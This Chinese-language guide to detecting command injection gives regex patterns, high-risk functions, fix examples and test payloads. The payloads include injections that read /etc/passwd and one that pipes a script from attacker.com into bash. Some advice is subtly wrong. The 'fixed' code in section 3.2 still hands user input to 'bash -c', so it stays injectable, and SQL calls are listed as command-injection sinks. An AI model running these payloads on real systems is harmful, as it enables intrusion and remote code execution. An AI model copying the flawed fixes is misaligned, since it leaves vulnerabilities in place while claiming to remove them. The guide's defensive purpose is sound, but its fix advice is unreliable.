# 命令注入检测规则

基于SKILL.md漏洞检测规则案例库的命令注入检测规则

## 1. 检测模式

### 1.1 危险函数调用
```regex
# Java
Runtime\.getRuntime\(\)\.exec\s*\(.*["']?\s*\+
ProcessBuilder\s*\(\s*["']?\s*\+
jdbcTemplate\.execute\s*\(\s*["']?\s*\+
jdbcTemplate\.update\s*\(\s*["']?\s*\+

# Python
os\.system\s*\(\s*["']?\s*\+
subprocess\.(run|call|Popen)\s*\(\s*["']?\s*\+
exec\s*\(\s*["']?\s*\+
eval\s*\(\s*["']?\s*\+

# PHP
exec\s*\(\s*["']?\s*\+
shell_exec\s*\(\s*["']?\s*\+
passthru\s*\(\s*["']?\s*\+
popen\s*\(\s*["']?\s*\+
system\s*\(\s*["']?\s*\+

# Go
exec\.Command\s*\(\s*["']?\s*\+
os/exec\.Command\s*\(\s*["']?\s*\+
syscall\.Exec\s*\(\s*["']?\s*\+
```

### 1.2 Shell转义缺失
```regex
# Java - 直接拼接命令
Runtime\.getRuntime\(\)\.exec\s*\(\s*["']?\s*[^"]*[^"]*\+
ProcessBuilder\s*\(\s*["']?\s*[^"]*[^"]*\+

# Python - shell=True
subprocess\.(run|call|Popen)\s*\([^,)]*shell\s*=\s*True[^)]*\+

# PHP - 直接拼接
exec\s*\(\s*["']?\s*[^"]*[^"]*\+
shell_exec\s*\(\s*["']?\s*[^"]*[^"]*\+
system\s*\(\s*["']?\s*[^"]*[^"]*\+
```

### 1.3 用户可控命令
```regex
# Java - 用户输入直接传递
Runtime\.getRuntime\(\)\.exec\s*\([^,)]*[^,)]*userInput[^,)]*\+
ProcessBuilder\s*\(\s*[^,)]*userInput[^,)]*\+

# Python - 用户输入直接传递
subprocess\.(run|call|Popen)\s*\([^,)]*userInput[^,)]*\+
os\.system\s*\(\s*["']?\s*[^"]*[^"]*userInput[^"]*\+

# PHP - 用户输入直接传递
exec\s*\(\s*["']?\s*[^"]*[^"]*userInput[^"]*\+
shell_exec\s*\(\s*["']?\s*[^"]*[^"]*userInput[^"]*\+
system\s*\(\s*["']?\s*[^"]*[^"]*userInput[^"]*\+
```

## 2. 高风险函数

### 2.1 Java
- `Runtime.getRuntime().exec()`
- `ProcessBuilder()`
- `jdbcTemplate.query()`
- `jdbcTemplate.update()`
- `jdbcTemplate.execute()`

### 2.2 Python
- `cursor.execute()`
- `execute()`
- `executemany()`
- `os.system()`
- `subprocess.run(shell=True)`
- `subprocess.call(shell=True)`
- `subprocess.Popen(shell=True)`
- `eval()`
- `exec()`

### 2.3 PHP
- `exec()`
- `shell_exec()`
- `passthru()`
- `system()`
- `popen()`
- `proc_open()`

### 2.4 Go
- `exec.Command()`
- `os/exec.Command()`
- `syscall.Exec()`

## 3. 修复建议

### 3.1 使用安全API替代
```java
// 修复前
Runtime.getRuntime().exec("ping " + userInput);

// 修复后 - 使用ProcessBuilder
ProcessBuilder pb = new ProcessBuilder("ping", userInput);
pb.redirectErrorStream(true);
Process process = pb.start();
```

```python
# 修复前
os.system("ping " + user_input)

# 修复后 - 使用subprocess
import subprocess
subprocess.run(["ping", user_input], shell=False, check=True)
```

### 3.2 参数列表执行
```java
// 修复前
Runtime.getRuntime().exec("bash -c 'echo " + userInput + "'");

// 修复后 - 使用ProcessBuilder
ProcessBuilder pb = new ProcessBuilder("bash", "-c", "echo " + userInput + "'");
pb.redirectErrorStream(true);
Process process = pb.start();
```

```python
# 修复前
os.system("bash -c 'echo " + user_input + "'")

# 修复后 - 使用subprocess
import subprocess
subprocess.run(["bash", "-c", "echo " + user_input + "'"], shell=False, check=True)
```

### 3.3 输入验证
```java
public void executeCommand(String command) {
    if (!isValidCommand(command)) {
        throw new IllegalArgumentException("Invalid command");
    }
    
    ProcessBuilder pb = new ProcessBuilder(command.split(" "));
    pb.redirectErrorStream(true);
    Process process = pb.start();
}
```

### 3.4 白名单验证
```java
private static final Set<String> ALLOWED_COMMANDS = Set.of("ping", "traceroute", "nslookup");

public void executeCommand(String command) {
    String[] parts = command.split(" ");
    if (!ALLOWED_COMMANDS.contains(parts[0])) {
        throw new IllegalArgumentException("Command not allowed");
    }
    
    ProcessBuilder pb = new ProcessBuilder(parts);
    pb.redirectErrorStream(true);
    Process process = pb.start();
}
```

## 4. 测试Payload

### 4.1 基础注入
```bash
# 命令分隔符
curl -X POST "http://example.com/api/execute" -d "command=example.com; cat /etc/passwd"

# 管道注入
curl -X POST "http://example.com/api/execute" -d "command=example.com | whoami"

# 反引号注入
curl -X POST "http://example.com/api/execute" -d "command=example.com`whoami`"

# 双引号注入
curl -X POST "http://example.com/api/execute" -d 'command=example.com"whoami"'
```

### 4.2 高级注入
```bash
# 命令链
curl -X POST "http://example.com/api/execute" -d "command=ping -c 1 127.0.0.1 & sleep 1 & ping -c 2 127.0.0.1"

# 变量替换
curl -X POST "http://example.com/api/execute" -d "command=USER=admin; /bin/bash -c 'curl http://attacker.com/steal.sh | bash'"

# 命令替换
curl -X POST "http://example.com/api/execute" -d "command=$(echo whoami)"
```

## 5. 误报处理

### 5.1 常见误报场景
- 使用参数化查询但参数来自配置文件
- 使用命令执行但命令经过严格验证
- 使用用户输入但输入经过白名单验证

### 5.2 误报排除规则
- 排除测试代码中的命令执行
- 排除已修复的代码
- 排除使用了输入验证的代码
- 排除使用了白名单验证的代码